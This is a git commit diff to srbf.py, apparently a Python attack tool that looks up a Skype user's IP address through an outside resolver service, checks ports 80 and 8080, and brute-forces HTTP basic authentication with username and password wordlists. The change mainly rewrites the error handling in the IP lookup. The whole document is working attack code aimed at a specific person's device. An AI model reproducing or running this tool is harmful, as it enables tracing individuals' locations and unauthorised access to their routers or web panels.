9eb39003f9adf4af785b7c6065321fa1543d8de8
Matheus Bernardes <mthbernardes@gmail.com>
2015-10-21 00:06:14 -0200

    Update srbf.py

--- srbf.py
+++ srbf.py
@@ -22,24 +22,21 @@ def banner():
 	print
 
 def skype():
-	try:
-		skype_name = raw_input('[+] - Provide the skype Username: ')
-		print '[+] - Trying to find IP address...'
-		r = requests.post('http://api.predator.wtf/resolver/?arguments='+skype_name)
-		ip = r.text
-		if ip in 'Crap, No IP Was Found':
-			print red+'[+] - '+ip+'  - [+]'+endc
-			exit
-		else:
-			print green+"[+] - IP Address founded "+ip+endc
-			return ip
-	
-	except:
-		print
-		print red+'[+] - Error - [+]'+endc
-		print red+'[+] - Exiting - [+]'+endc
+	skype_name = raw_input('[+] - Provide the skype Username: ')
+	print '[+] - Trying to find IP address...'
+	r = requests.post('http://api.predator.wtf/resolver/?arguments='+skype_name)
+	ip = r.text
+
+	if ip.find('Crap,') != -1:
+		print red+'[+] - '+ip+'  - [+]'+endc
 		exit()
-		
+	elif ip.find('Incorrect') != -1:
+		print red+'[+] - '+ip+'  - [+]'+endc
+		exit()
+	else:
+		print green+"[+] - IP Address founded "+ip+endc
+		return ip
+
 def port_check(ip):
 	print '[+] - Scanning for http open port...'
 	for port in (80,8080):
@@ -60,7 +57,7 @@ def single(ip,port):
 		usuario_f= open('wordlist/c_user.txt','r')
 		senha_r	= senha_f.read().splitlines()
 		usuario_r = usuario_f.read().splitlines()
-	
+
 	elif r == 'n':
 		usuario_i = raw_input('Please provide the file with the username(s): ')
 		senha_i = raw_input('Please provide the file with the passwords: ')
@@ -68,7 +65,7 @@ def single(ip,port):
 		usuario_f = open(usuario_i,'r')
 		senha_r = senha_f.read().splitlines()
 		usuario_r = usuario_f.read().splitlines()
-	
+
 	for user in usuario_r:
 		for password in senha_r:
 			r = requests.get('http://'+ip+':'+port, auth=(user, password))
